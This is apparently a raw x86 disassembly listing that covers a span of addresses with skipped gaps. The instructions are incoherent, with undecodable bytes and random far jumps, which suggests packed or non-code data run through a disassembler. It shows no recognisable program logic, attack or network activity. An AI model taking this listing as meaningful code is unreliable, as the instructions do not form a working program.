  423e55:	aad    0x96
  423e57:	aas    
  423e58:	sbb    eax,0xfa98993b
  423e5d:	mov    DWORD PTR [edi-0x4cfe08f6],edx
  423e63:	mov    ah,0x19
  423e65:	retf   
  423e66:	je     0x423e95
  423e68:	fld    QWORD PTR [eax]
  423e6a:	mov    edi,0x26a595ec
  423e6f:	std    
  423e70:	or     al,0x3b
  423e72:	cli    
  423e73:	sub    al,0x2b
  423e75:	int3   
  423e76:	ret    
  423e77:	sbb    bl,BYTE PTR [ecx-0x57]
  423e7a:	jmp    0x16d8:0xec857446
  423e81:	nop
  423e82:	ud0    esi,eax
  423e85:	shl    DWORD PTR [ecx-0x71],1
  423e88:	repz mov ds:0x4d775684,eax
  423e8e:	not    DWORD PTR [esi+0x4d]
  423e91:	mov    al,0x3d
  423e93:	adc    al,0xb4
  423e95:	(bad)  [eax]
  423e97:	ret    0xbb55
  423e9a:	adc    bh,BYTE PTR [edx+0x35]
  423e9d:	adc    dh,BYTE PTR [eax+ebp*4+0x66c6015d]
  423ea4:	dec    esi
  423ea5:	xchg   DWORD PTR [ecx-0x78],ebp
  423ea8:	jns    0x423f21
  423eaa:	xor    BYTE PTR [esi],bh
  423eac:	mov    edx,0xe0e23eb6
  423eb1:	in     eax,0x1a
  423eb3:	inc    esi
  423eb4:	aam    0x0
	...
  423f16:	scas   al,BYTE PTR es:[edi]
  423f17:	call   0x9fff:0xff74b964
  423f1e:	xor    ebp,esi
  423f20:	xchg   BYTE PTR [eax-0x3f],dl
  423f23:	dec    ebx
  423f24:	jo     0x423f75
  423f26:	call   0x1:0x700017e
  423f2d:	add    BYTE PTR [edi+0x4abbb263],al
  423f33:	sti    
  423f34:	into   
  423f35:	mov    gs,WORD PTR [ebx-0x3f262583]
  423f3b:	push   ecx
  423f3c:	jp     0x423faa
  423f3e:	xchg   esp,eax
  423f3f:	jp     0x423fa5
  423f41:	jne    0x423f4e
  423f43:	adc    DWORD PTR [esi+0x1b],ebx
  423f46:	mov    eax,0x7031f2b7
  423f4b:	in     eax,dx
  423f4c:	in     al,dx
  423f4d:	ja     0x423f1d
  423f4f:	xor    DWORD PTR [edx],0x531ea86a
  423f55:	lods   eax,DWORD PTR ds:[esi]
  423f56:	xchg   ecx,eax
  423f57:	jmp    0x423f1b
  423f59:	cld    
  423f5a:	mov    ebx,0xda9da239
  423f5f:	jbe    0x423f18
  423f61:	data16 xor al,0x4a
  423f64:	mov    esp,DWORD PTR [ebx+0x4f]
  423f67:	xor    eax,0x2a8ac2e1
  423f6c:	mov    ch,0xfb
  423f6e:	push   esp
  423f6f:	popa   
  423f70:	jnp    0x423fe0
  423f72:	gs dec edi
  423f74:	in     eax,0xd9
  423f76:	mov    esi,0x66df7305
  423f7b:	adc    DWORD PTR [ecx+0x7aec314f],edx
  423f81:	or     eax,0x4a23a645
  423f86:	daa    
  423f87:	bound  esi,QWORD PTR [ecx]
  423f89:	rol    BYTE PTR [edx+0x100f112d],0x9b
  423f90:	jg     0x423f8f
  423f92:	push   edi
  423f93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423f94:	add    eax,DWORD PTR [ecx+0xd]
  423f97:	xchg   esi,eax
  423f98:	dec    edi
  423f99:	fdivr  st(0),st
  423f9b:	pop    ebp
  423f9c:	mov    ebx,0xc9bf25fa
  423fa1:	shr    bl,cl
  423fa3:	fwait
  423fa4:	gs cmp eax,0x9fd5531b
  423faa:	jmp    0x423fb0
  423fac:	or     BYTE PTR [ecx+ecx*2+0x31],dh
  423fb0:	and    al,0x41
  423fb2:	xor    al,0xb6
  423fb4:	ss cmp ebx,ebx
  423fb7:	mov    esp,0xf4fc0ee
  423fbc:	aaa    
  423fbd:	and    ecx,eax
  423fbf:	dec    esi
  423fc0:	or     al,0x63
  423fc2:	pop    edi
  423fc3:	in     al,dx
  423fc4:	es aaa 
  423fc6:	sbb    DWORD PTR [bp+si+0x1949],ebx
  423fcb:	mov    cs:0x8bf8529c,al
  423fd1:	inc    ebp
  423fd2:	imul   eax,DWORD PTR [esi+0x2154eb2e],0x79bdd639
  423fdc:	sbb    al,0x4e
  423fde:	jno    0x423f8b
  423fe0:	daa    
  423fe1:	lea    edx,ds:0xae00d986
  423fe7:	and    DWORD PTR [edi+edx*4],edi
  423fea:	sub    ebx,DWORD PTR [edx-0x32]
  423fed:	cwde   
  423fee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423fef:	and    BYTE PTR [eax-0x68],dl
  423ff2:	adc    BYTE PTR [edx+edx*8],cl
  423ff5:	and    bh,bh
  423ff7:	lahf   
  423ff8:	lods   al,BYTE PTR ds:[esi]
  423ff9:	out    dx,eax
  423ffa:	adc    DWORD PTR [edx+0x6232d367],ecx
  424000:	inc    esp
  424001:	shr    BYTE PTR [ecx+ebx*8],cl
  424004:	sbb    cl,bh
  424006:	pop    edi
  424007:	aas    
  424008:	je     0x424019
  42400a:	add    bh,ah
  42400c:	dec    edx
  42400d:	ins    DWORD PTR es:[edi],dx
  42400e:	pop    esi
  42400f:	xchg   edx,eax
  424010:	std    
  424011:	and    al,0xb7
  424013:	add    BYTE PTR [esi-0x42b4305d],0x2c
  42401a:	jmp    0xc242fc90
  42401f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424020:	pushf  
  424021:	mov    DWORD PTR [esi],esi
  424023:	xor    dl,BYTE PTR [eax]
  424025:	and    esp,DWORD PTR [esi+0x40]
  424028:	sti    
  424029:	sub    bl,bl
  42402b:	xchg   ecx,eax
  42402c:	in     al,dx
  42402d:	xor    eax,edx
  42402f:	sbb    dl,BYTE PTR [ebp+0x31]
  424032:	mov    cs,WORD PTR [eax+edi*8+0x0]
	...
  424096:	jl     0x4240f0
  424098:	cs mov cl,0x2e
  42409b:	idiv   edi
  42409d:	fnsave [edi-0x4755e30f]
  4240a3:	mov    al,0xd9
  4240a5:	cld    
  4240a6:	mov    eax,ds:0x700017f
  4240ab:	add    DWORD PTR [eax],eax
  4240ad:	add    bl,dl
  4240af:	mov    esi,ecx
  4240b1:	fwait
  4240b2:	retf   
  4240b3:	mov    eax,0xc760b329
  4240b8:	and    eax,0x4517a4d1
  4240bd:	addr16 mov ?,ecx
  4240c0:	mov    al,ds:0x9d020790
  4240c5:	sbb    dl,BYTE PTR [ecx+edx*4+0x24]
  4240c9:	ja     0x424140
  4240cb:	mov    BYTE PTR [ebp-0x5f8d2d3d],ah
  4240d1:	xchg   ebp,eax
  4240d2:	outs   dx,DWORD PTR ds:[esi]
  4240d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4240d4:	fstp   QWORD PTR [ebx-0x80]
  4240d7:	icebp  
  4240d8:	lahf   
  4240d9:	mov    dh,0x3f
  4240db:	push   esp
  4240dc:	mov    es,WORD PTR [esp+edx*8]
  4240df:	xchg   ebx,eax
  4240e0:	icebp  
  4240e1:	(bad)  
  4240e2:	mov    edi,0x9e58322c
  4240e7:	data16 icebp 
  4240e9:	mov    DWORD PTR [esi],esi
  4240eb:	sbb    DWORD PTR [esi*4+0x12e7c502],esp
  4240f2:	mov    esp,0x2e264d89
  4240f7:	or     eax,0x9e95d193
  4240fc:	test   eax,ebp
  4240fe:	stc    
  4240ff:	sbb    BYTE PTR [edx],al
  424101:	(bad)  
  424102:	(bad)  
  424103:	cld    
  424104:	inc    esp
  424105:	dec    ecx
  424106:	xor    BYTE PTR [edx+0x58175940],bl
  42410c:	les    edx,FWORD PTR [esi-0x5a]
  42410f:	mov    edx,0x6eecb1ba
  424114:	xor    al,0xe7
  424116:	xchg   ecx,eax
  424117:	jp     0x424114
  424119:	repnz sub eax,0x94469d69
  42411f:	xor    BYTE PTR [ebx-0x71d84354],bh
  424125:	adc    eax,0xa9dcb8eb
  42412a:	cmc    
  42412b:	add    eax,0xa5c41d2c
  424130:	jo     0x42416e
  424132:	xor    eax,0xc685bf3c
  424137:	inc    esp
  424138:	inc    ecx
  424139:	std    
  42413a:	mov    ebx,0x12882e94
  42413f:	xor    ah,BYTE PTR [edi+0x60]
  424142:	mov    edi,0xa6d7b696
  424147:	adc    BYTE PTR [edx+0x50ac960f],dl
  42414d:	ror    BYTE PTR [edi],0x1c
  424150:	jns    0x424110
  424152:	jne    0x42414f
  424154:	jbe    0x424150
  424156:	stos   BYTE PTR es:[edi],al
  424157:	fmul   DWORD PTR [edi-0x6fe3b93]
  42415e:	push   edx
  42415f:	xchg   edi,eax
  424160:	into   
  424161:	cmp    DWORD PTR [esi+edx*1],ebp
  424164:	sbb    dh,BYTE PTR [ebx]
  424166:	mov    bh,0xd7
  424168:	cmp    al,0xc5
  42416a:	sar    DWORD PTR [esi],cl
  42416c:	or     esi,DWORD PTR [ebx+0x1e8b4702]
  424172:	aaa    
  424173:	daa    
  424174:	test   al,0xcf
  424176:	(bad)  
  424177:	shl    BYTE PTR [ecx-0x760c1dd2],cl
  42417d:	sub    ah,dh
  42417f:	xchg   BYTE PTR [ecx+0x2e],al
  424182:	jmp    0x32f8b3c9
  424187:	xchg   ebp,eax
  424188:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424189:	pushf  
  42418a:	jb     0x4241ea
  42418c:	(bad)  
  42418d:	jecxz  0x4241b0
  42418f:	jno    0xd30572c5
  424195:	pop    esi
  424196:	cmp    edx,DWORD PTR [esi]
  424198:	push   edx
  424199:	retf   0x34ab
  42419c:	sub    DWORD PTR [esi+0x41],0xffffffd0
  4241a0:	xor    eax,0xc20a3751
  4241a5:	mov    eax,0x1289c909
  4241aa:	sub    ebx,DWORD PTR [ebx+0x5e]
  4241ad:	push   ebx
  4241ae:	cmp    eax,0x2c8ba554
  4241b3:	stos   DWORD PTR es:[edi],eax
  4241b4:	inc    edx
	...
  424215:	add    BYTE PTR [edi-0x4c275c4c],al
  42421b:	(bad)  
  42421d:	call   DWORD PTR [edi+0x23d4b417]
  424223:	fimul  WORD PTR [esi-0x71]
  424226:	test   al,0x80
  424228:	add    DWORD PTR [eax],eax
  42422a:	pop    es
  42422b:	add    DWORD PTR [eax],eax
  42422d:	add    BYTE PTR [ebx+edx*1+0x3a02bcb4],bh
  424234:	(bad)  
  424235:	stc    
  424236:	mov    ds:0xfff848fd,eax
  42423b:	and    eax,0xb34e3edb
  424240:	jb     0x424248
  424242:	mov    eax,ds:0xec5b79e4
  424247:	loop   0x42422b
  424249:	stos   BYTE PTR es:[edi],al
  42424a:	and    bl,cl
  42424c:	aas    
  42424d:	mov    dl,0xb5
  42424f:	jbe    0x424247
  424251:	xchg   BYTE PTR [eiz*2+0x6216cbe],bl
  424258:	cli    
  424259:	and    BYTE PTR [edi-0x53],0xe3
  42425d:	mov    ds:0x56cb3f04,eax
  424262:	mov    dl,0x2d
  424264:	add    DWORD PTR [edi+0x19],0x51
  424268:	jp     0x424271
  42426a:	adc    BYTE PTR [ebx+0x23932225],bh
  424270:	inc    ebp
  424271:	popf   
  424272:	dec    edi
  424273:	jmp    0x42426e
  424275:	xor    cl,BYTE PTR [edi+0x78]
  424278:	add    eax,0xa1ba5f40
  42427d:	sbb    al,BYTE PTR [ebx]
  42427f:	and    eax,0x34ae0803
  424284:	stos   BYTE PTR es:[edi],al
  424285:	cmp    al,0x6e
  424287:	jmp    0x340:0xd82ad7f4
  42428e:	jl     0x424271
  424290:	xor    DWORD PTR [ecx],esi
  424292:	aad    0x52
  424294:	lds    ecx,FWORD PTR [eax-0xfb7ae54]
  42429a:	dec    ecx
  42429b:	push   ecx
  42429c:	mov    edx,0xdf92c908
  4242a1:	push   esi
  4242a2:	outs   dx,BYTE PTR ds:[esi]
  4242a3:	sub    DWORD PTR fs:[eax-0x7c],ecx
  4242a7:	outs   dx,DWORD PTR ds:[si]
  4242a9:	xchg   ecx,eax
  4242aa:	add    al,0xda
  4242ac:	mov    ds:0xd1f6fc0f,al
  4242b1:	jmp    0x42e8:0xbd30acca
  4242b8:	test   BYTE PTR [esp+ebx*2],al
  4242bb:	cmp    bl,BYTE PTR [edx+0x59251760]
  4242c1:	pop    edi
  4242c2:	das    
  4242c3:	adc    BYTE PTR ds:0x9533cbc8,ah
  4242c9:	repz stc 
  4242cb:	adc    eax,0x60283921
  4242d0:	shr    ebx,1
  4242d2:	jg     0x42434d
  4242d4:	shl    bh,cl
  4242d6:	ret    0x853
  4242d9:	mov    ds:0xc223e93e,eax
  4242de:	xor    ch,BYTE PTR [edx]
  4242e0:	iret   
  4242e1:	daa    
  4242e2:	xchg   BYTE PTR [ebx+0x59],bl
  4242e5:	rcr    BYTE PTR fs:[edi+0x1f],1
  4242e9:	or     ah,bh
  4242eb:	xor    BYTE PTR [edi+0x43],0x3d
  4242ef:	sbb    al,0xc4
  4242f1:	pop    ebx
  4242f2:	xor    BYTE PTR [edi+0xb10ab86],cl
  4242f8:	lds    ebp,FWORD PTR [edx]
  4242fa:	pop    esi
  4242fb:	mov    bh,0x6f
  4242fd:	ja     0x42428c
  4242ff:	sub    DWORD PTR [edi+0x7e],0xb194ebb2
  424306:	jns    0x424295
  424308:	fdiv   DWORD PTR [edx+0x3744939d]
  42430e:	daa    
  42430f:	adc    BYTE PTR [ecx-0x46],ch
  424312:	mov    esi,0x4814de36
  424317:	dec    ebp
  424318:	addr16 in al,0xa3
  42431b:	cmp    edi,DWORD PTR [ebx+0x45]
  42431e:	repz inc ecx
  424320:	mov    bl,0xe9
  424322:	mov    bh,0xad
  424324:	mov    cl,0x1
  424326:	into   
  424327:	and    dh,BYTE PTR [ebp-0x6c]
  42432a:	imul   esi,ecx,0x5c
  42432d:	ss jge 0x424378
  424330:	xor    al,0x81
  424332:	ja     0x42431e
  424334:	xchg   BYTE PTR [eax],al
	...
  424396:	mov    ah,BYTE PTR [esi]
  424398:	jge    0x424354
  42439a:	std    
  42439b:	sti    
  42439c:	iret   
  42439d:	test   DWORD PTR ss:[ebx],ebx
  4243a0:	sub    edx,ebp
  4243a2:	inc    esi
  4243a3:	scas   al,BYTE PTR es:[edi]
  4243a4:	push   ss
  4243a5:	mov    bh,0xaf
  4243a7:	add    DWORD PTR [ecx],0x10700
  4243ad:	add    BYTE PTR [ecx],bl
  4243af:	inc    ebp
  4243b0:	xchg   ebx,eax
  4243b1:	pop    ebx
  4243b2:	dec    eax
  4243b3:	adc    ebx,DWORD PTR ds:0x10e41a12
  4243b9:	aam    0x6
  4243bb:	dec    eax
  4243bc:	hlt    
  4243bd:	mov    edi,0x1672c533
  4243c2:	cmp    al,0xe8
  4243c4:	jnp    0x424420
  4243c6:	out    0x32,eax
  4243c8:	stos   DWORD PTR es:[edi],eax
  4243c9:	jle    0x42438f
  4243cb:	ja     0x424398
  4243cd:	stos   DWORD PTR es:[edi],eax
  4243ce:	scas   al,BYTE PTR es:[edi]
  4243cf:	imul   ecx,DWORD PTR [edx],0x7090f302
  4243d5:	xchg   ecx,eax
  4243d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4243d7:	jp     0x42436a
  4243d9:	ret    
  4243da:	mov    ds:0x3fafa1be,al
  4243df:	in     eax,dx
  4243e0:	fwait
  4243e1:	sar    BYTE PTR [ebx+0x63b651e5],cl
  4243e7:	clc    
  4243e8:	add    al,0xa8
  4243ea:	and    BYTE PTR [eax],0x5a
  4243ed:	mov    ecx,DWORD PTR [ebp+ecx*2+0x57a14b62]
  4243f4:	das    
  4243f5:	and    esi,edx
  4243f7:	repz sub DWORD PTR [edi-0x51],ecx
  4243fb:	repnz ss inc ebx
  4243fe:	hlt    
  4243ff:	mov    dl,0x8e
  424401:	mov    ecx,0x41c98da3
  424406:	out    0x1c,al
  424408:	or     eax,0xc7250dce
  42440d:	xchg   ecx,eax
  42440e:	add    bl,al
  424410:	cmc    
  424411:	test   BYTE PTR [eax+ebp*8],dh
  424414:	int    0x92
  424416:	push   ds
  424417:	pop    edx
  424418:	mul    DWORD PTR ds:0xca088a6a
  42441e:	cmp    dh,BYTE PTR [ecx+0x66]
  424421:	(bad)  
  424423:	call   0x2d88:0x5f990637
  42442a:	pop    ecx
  42442b:	cmp    ebp,0xb
  42442e:	repnz xor bh,BYTE PTR [edx]
  424431:	outs   dx,DWORD PTR ds:[esi]
  424432:	add    DWORD PTR [edx],ecx
  424434:	les    edx,FWORD PTR [eax-0x4780ab48]
  42443a:	jge    0x42449f
  42443c:	add    BYTE PTR [ecx+eax*4-0x6d187a97],ah
  424443:	retf   
  424444:	adc    al,0xab
  424446:	and    ebp,esi
  424448:	stc    
  424449:	inc    ecx
  42444a:	stc    
  42444b:	les    edx,FWORD PTR [ecx-0x46d07a8]
  424451:	jle    0x424452
  424453:	mov    dh,0x9d
  424455:	adc    edi,DWORD PTR [ebp-0x3]
  424458:	mov    esi,0xaa0de43
  42445d:	pushf  
  42445e:	pop    ss
  42445f:	jp     0x424420
  424461:	out    dx,al
  424462:	ja     0x42441e
  424464:	loop   0x4244b1
  424466:	jne    0x424478
  424468:	xchg   esp,eax
  424469:	ror    BYTE PTR [eax+0x5fa79abe],0x6e
  424470:	repnz inc DWORD PTR [ecx]
  424473:	xchg   edi,eax
  424474:	ds test eax,0xd79b66f0
  42447a:	xchg   esi,eax
  42447b:	push   ss
  42447c:	adc    BYTE PTR [esi],al
  42447e:	xchg   esi,eax
  42447f:	push   0x8041fcd8
  424484:	xchg   ecx,eax
  424485:	cli    
  424486:	out    dx,al
  424487:	xor    ebp,ecx
  424489:	xlat   BYTE PTR ds:[ebx]
  42448a:	in     eax,0xed
  42448c:	aaa    
  42448d:	inc    edx
  42448e:	inc    edi
  42448f:	mov    ebx,0x3f0c6f76
  424494:	hlt    
  424495:	into   
  424496:	repz jg 0x4244c9
  424499:	mov    DWORD PTR [esi],ecx
  42449b:	jmp    0x42450b
  42449d:	loop   0x424447
  42449f:	and    dh,bl
  4244a1:	jmp    0x46fd5e28
  4244a6:	push   ebp
  4244a7:	sub    DWORD PTR [eax-0x65527aa0],ebx
  4244ad:	push   0x4b
  4244af:	dec    ebp
  4244b0:	hlt    
  4244b1:	xchg   ebp,eax
  4244b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4244b4:	sub    BYTE PTR [eax],al
	...
  424516:	loopne 0x424587
  424518:	xchg   esi,eax
  424519:	inc    edx
  42451a:	lahf   
  42451b:	sti    
  42451c:	hlt    
  42451d:	out    dx,eax
  42451e:	mov    al,ds:0x810ff3ab
  424523:	jb     0x424591
  424525:	(bad)  
  424526:	mov    dh,0x82
  424528:	add    DWORD PTR [eax],eax
  42452a:	pop    es
  42452b:	add    DWORD PTR [eax],eax
  42452d:	add    BYTE PTR [edi+0x6d765a7c],cl
  424533:	mov    WORD PTR [esi+0x5e4b698c],ds
  424539:	adc    esp,DWORD PTR [eax]
  42453b:	fcmovnu st,st(7)
  42453d:	cmp    eax,0xecb49df5
  424542:	inc    ebp
  424543:	pusha  
  424544:	xchg   edx,eax
  424545:	(bad)  
  424546:	aaa    
  424547:	push   0x2c
  424549:	rol    bl,1
  42454b:	aam    0x8c
  42454d:	test   DWORD PTR [esi-0x3dffdcea],esi
  424553:	lea    esp,[esi-0xb]
  424556:	push   eax
  424557:	pop    es
  424558:	aaa    
  424559:	fld    st(4)
  42455b:	ficom  WORD PTR [eax+0x3d5b9590]
  424561:	mov    es,WORD PTR [ebp+eiz*2+0x2cca99df]
  424568:	pushf  
  424569:	cld    
  42456a:	jo     0x424576
  42456c:	fucomip st,st(7)
  42456e:	xchg   ecx,eax
  42456f:	mov    cl,0x87
  424571:	add    esi,ebp
  424573:	pop    ds
  424574:	stos   BYTE PTR es:[edi],al
  424575:	mov    ch,0x11
  424577:	mov    esp,ds
  424579:	or     eax,0xbf4074c7
  42457e:	test   ebp,ebx
  424580:	sub    esi,edi
  424582:	lock jno 0x4245f7
  424585:	mov    al,0x7c
  424587:	scas   eax,DWORD PTR es:[edi]
  424588:	cmp    ecx,DWORD PTR [esi+0x16]
  42458b:	cmc    
  42458c:	mov    ss,WORD PTR [ebp+0x2b]
  42458f:	cld    
  424590:	adc    bl,BYTE PTR [edi+edi*4]
  424593:	jmp    0x28db6314
  424598:	dec    edi
  424599:	adc    ebp,DWORD PTR [ecx-0x71]
  42459c:	cmp    al,0x14
  42459e:	shr    BYTE PTR [ebx+eiz*1],0x15
  4245a2:	mov    eax,ds:0xe1c3a846
  4245a7:	cmp    eax,0x7ded819b
  4245ac:	les    esi,FWORD PTR [ebx]
  4245ae:	push   edx
  4245af:	mov    DWORD PTR [ecx+edi*8-0x46],ecx
  4245b3:	(bad)  
  4245b4:	(bad)  
  4245b5:	or     ecx,DWORD PTR [eax-0x53d3991]
  4245bb:	pop    esi
  4245bc:	cmc    
  4245bd:	adc    BYTE PTR [edi+edi*1+0x58],0x33
  4245c2:	push   0x729ce8e1
  4245c7:	sub    edi,DWORD PTR ds:0x1d802aa8
  4245cd:	mov    al,0x57
  4245cf:	pop    eax
  4245d0:	call   0x2e67:0x2ed10d23
  4245d7:	das    
  4245d8:	pop    edi
  4245d9:	sub    dh,BYTE PTR [edx]
  4245db:	pop    esi
  4245dc:	aaa    
  4245dd:	xlat   BYTE PTR ds:[ebx]
  4245de:	sub    esp,0x3e
  4245e1:	pop    edi
  4245e2:	mov    cl,0xd
  4245e4:	xchg   edi,eax
  4245e5:	in     al,dx
  4245e6:	inc    ebp
  4245e7:	sbb    eax,0xe107e115
  4245ec:	test   eax,0x5bacb385
  4245f1:	inc    ebx
  4245f2:	ss adc esi,edx
  4245f5:	and    edi,DWORD PTR [eax]
  4245f7:	inc    edx
  4245f8:	mov    bl,0xab
  4245fa:	jmp    0x94c1:0xa9fe6f1f
  424601:	aam    0xd2
  424603:	sbb    BYTE PTR [edi-0x2db82475],al
  424609:	adc    eax,0xa70b36c
  42460e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42460f:	push   ss
  424610:	test   al,0x62
  424612:	idiv   BYTE PTR [edx+ecx*4-0x555f8dfe]
  424619:	push   edi
  42461a:	xor    BYTE PTR [esi+0x68622797],al
  424620:	sub    edi,DWORD PTR [eax-0x7ae3d4b]
  424626:	cmc    
  424627:	push   ecx
  424628:	fimul  DWORD PTR [eax]
  42462a:	cmp    eax,0x37b5f900
  42462f:	addr16 cli 
  424631:	sahf   
  424632:	clc    
  424633:	mov    WORD PTR [esi],cs
	...
  424695:	add    BYTE PTR [edx+edx*4-0x10004],bh
  42469c:	mov    edi,0x8f38d4d3
  4246a1:	cmp    edi,DWORD PTR [ecx-0x6a]
  4246a4:	rol    DWORD PTR [ebp+edi*4+0x7000183],1
  4246ab:	add    DWORD PTR [eax],eax
  4246ad:	add    dl,bl
  4246af:	mov    ecx,0x2ee7dbd7
  4246b4:	inc    eax
  4246b5:	mov    ds,WORD PTR [ebx+0x491d307d]
  4246bb:	pop    ss
  4246bc:	adc    ecx,DWORD PTR [ebx+edi*4+0x5b8ce5be]
  4246c3:	jne    0x42465d
  4246c5:	pop    ebx
  4246c6:	or     edi,ecx
  4246c8:	data16 das 
  4246ca:	or     al,0x59
  4246cc:	iret   
  4246cd:	enter  0x4295,0x16
  4246d1:	dec    edx
  4246d2:	sbb    DWORD PTR [ecx],esi
  4246d4:	adc    esi,0xffffff97
  4246d7:	or     eax,0xfc5c5a4e
  4246dc:	pop    ecx
  4246dd:	pop    edi
  4246de:	cmovne esi,ecx
  4246e1:	gs xchg edi,eax
  4246e3:	sbb    DWORD PTR [ebp+0x5291739b],ecx
  4246e9:	mov    ecx,0xcc4faf1d
  4246ee:	and    BYTE PTR [eax-0x3112026e],al
  4246f4:	push   edx
  4246f5:	or     edx,esi
  4246f7:	adc    al,0x8b
  4246f9:	pop    ebp
  4246fa:	mov    dl,0x97
  4246fc:	(bad)  [esi+0x6133a016]
  424702:	bound  esi,QWORD PTR [esi]
  424704:	pop    esp
  424705:	ins    BYTE PTR es:[edi],dx
  424706:	jmp    0x653e:0x96f9b29a
  42470d:	fbld   TBYTE PTR [ecx+0x75]
  424710:	jl     0x424753
  424712:	jp     0x4246c4
  424714:	sahf   
  424715:	xchg   esi,eax
  424716:	js     0x42470f
  424718:	sub    al,0x85
  42471a:	push   ebx
  42471b:	icebp  
  42471c:	push   edi
  42471d:	sbb    esp,DWORD PTR [ecx+0x7f963ad3]
  424723:	outs   dx,DWORD PTR ds:[esi]
  424724:	(bad)  
  424725:	xor    al,0xc7
  424727:	pop    ebx
  424728:	je     0x424700
  42472a:	sbb    bl,BYTE PTR [edx+ebx*8]
  42472d:	outs   dx,DWORD PTR ds:[esi]
  42472e:	mov    esi,0x756845d9
  424733:	xchg   BYTE PTR [ebx],cl
  424735:	gs je  0x424736
  424738:	cmp    esp,eax
  42473a:	xor    eax,0x9a6dcc1d
  42473f:	loop   0x4247a3
  424741:	push   ebx
  424742:	call   0xa56e:0x87042244
  424749:	in     al,0xf5
  42474b:	cmp    DWORD PTR [ecx+ebx*1-0x2a6fd804],edx
  424752:	and    edx,0xffffffb3
  424755:	dec    ecx
  424756:	jle    0x42473f
  424758:	or     eax,0x5c0fa310
  42475d:	leave  
  42475e:	inc    esi
  42475f:	adc    DWORD PTR [edi],0x72c7a5c2
  424765:	and    al,0xff
  424767:	das    
  424768:	ss test eax,0xab194b58
  42476e:	add    eax,DWORD PTR [eax-0x7843b68d]
  424774:	repz int 0xb
  424777:	mov    bh,0x4
  424779:	sub    eax,0xcf701db7
  42477e:	in     al,dx
  42477f:	dec    ebx
  424780:	mov    edx,0x3b870463
  424785:	pop    ss
  424786:	in     eax,0x46
  424788:	in     al,dx
  424789:	add    eax,0xfeb2844e
  42478e:	cmp    eax,0x18ae9082
  424793:	sbb    DWORD PTR [ecx-0x591875b7],edi
  424799:	rol    DWORD PTR [edi+eiz*4],1
  42479c:	repnz mov ebx,0x62640a5b
  4247a2:	icebp  
  4247a3:	mov    ds:0xfcdcdc54,al
  4247a8:	sbb    eax,0x613c489e
  4247ad:	jp     0x424763
  4247af:	mov    ebp,0x1e388a27
  4247b4:	cli    
	...
  424815:	add    BYTE PTR [edx],ah
  424817:	pop    eax
  424818:	test   bh,ch
  42481a:	(bad)  
  42481b:	jmp    FWORD PTR [ebx-0x23]
  42481e:	rol    DWORD PTR [eax+0x46e1f822],0xa8
  424825:	cld    
  424826:	les    eax,FWORD PTR [ecx+eax*1+0x10700]
  42482d:	add    cl,bl
  42482f:	mov    ecx,0x6e37d862
  424834:	adc    al,0x6e
  424836:	das    
  424837:	mov    esi,0x1ad262bd
  42483c:	leave  
  42483d:	loope  0x424815
  42483f:	xor    al,0x3b
  424841:	(bad)
  424844:	fs ret 0x63ae
  424848:	mov    ch,0xbe
  42484a:	mov    ds:0xdb1fa0c3,eax
  42484f:	mov    esi,0xf9b39e4b
  424854:	sbb    eax,0x473a12fd
  424859:	inc    ebx
  42485a:	mov    bl,0x18
  42485c:	cmp    edx,esp
  42485e:	mov    edi,0x36caf497
  424863:	cld    
  424864:	push   esi
  424865:	xchg   BYTE PTR [eax],bl
  424867:	inc    ebp
  424868:	push   ecx
  424869:	mov    ecx,0xe64b8523
  42486e:	and    edx,DWORD PTR [edi+0x153949fa]
  424874:	pop    edx
  424875:	arpl   WORD PTR [esi+0x4ab93836],ax
  42487b:	dec    ebp
  42487c:	ja     0x4248b2
  42487e:	mov    al,ds:0xb6aadd87
  424883:	and    DWORD PTR [ebx-0x2e374263],ebp
  424889:	xchg   ebx,eax
  42488a:	aaa    
  42488b:	repnz das 
  42488d:	cmp    BYTE PTR [ebx],al
  42488f:	in     eax,dx
  424890:	dec    DWORD PTR [edx]
  424892:	adc    DWORD PTR [edi-0x64],0x42699339
  424899:	fcmovnbe st,st(1)
  42489b:	test   edx,0x79f8168d
  4248a1:	stos   DWORD PTR es:[edi],eax
  4248a2:	jg     0x42487f
  4248a4:	cld    
  4248a5:	dec    ebx
  4248a6:	out    0x34,eax
  4248a8:	cli    
  4248a9:	in     eax,0xf1
  4248ab:	aam    0xd9
  4248ad:	je     0x4248ae
  4248af:	sub    al,0xb3
  4248b1:	mov    bl,0xb3
  4248b3:	mov    BYTE PTR [esi-0x4993c05],bl
  4248b9:	xor    DWORD PTR [ebx],ebx
  4248bb:	les    ebp,FWORD PTR [edi+0x7d]
  4248be:	enter  0x58c,0x1d
  4248c2:	mov    al,ds:0x497870cd
  4248c7:	xor    eax,0x3c76de7b
  4248cc:	gs arpl bp,si
  4248cf:	and    eax,0xff54ac6c
  4248d4:	add    dl,bl
  4248d6:	lock test al,0x3e
  4248d9:	sbb    al,0xdc
  4248db:	jno    0x4248ad
  4248dd:	lods   eax,DWORD PTR ds:[esi]
  4248de:	daa    
  4248df:	call   0xb160:0x5517b649
  4248e6:	pop    es
  4248e7:	sbb    eax,esi
  4248e9:	lods   al,BYTE PTR ds:[esi]
  4248ea:	fmul   st(3),st
  4248ec:	dec    ebx
  4248ed:	ret    
  4248ee:	sbb    al,0x59
  4248f0:	and    bl,BYTE PTR [eax]
  4248f2:	mul    DWORD PTR [ebp-0x528a2d72]
  4248f8:	test   eax,0x8b66c2c9
  4248fd:	outs   dx,DWORD PTR ds:[esi]
  4248fe:	cmp    edx,DWORD PTR [eax*4-0x571188fb]
  424905:	fldenv [edi+0x5]
  424908:	inc    esp
  424909:	into   
  42490a:	inc    esi
  42490b:	and    al,0x72
  42490d:	mov    ah,0xf7
  42490f:	popa   
  424910:	lods   eax,DWORD PTR ds:[esi]
  424911:	in     al,dx
  424912:	lea    esi,[edi+0x1]
  424915:	push   es
  424916:	ret    
  424917:	repnz (bad) 
  424919:	pop    ss
  42491a:	ror    ecx,cl
  42491c:	push   0xffffffaa
  42491e:	out    0xce,al
  424920:	xor    ecx,DWORD PTR [eax]
  424922:	in     eax,0xa7
  424924:	int    0xa4
  424926:	aaa    
  424927:	jmp    0x82605096
  42492c:	jae    0x4248f8
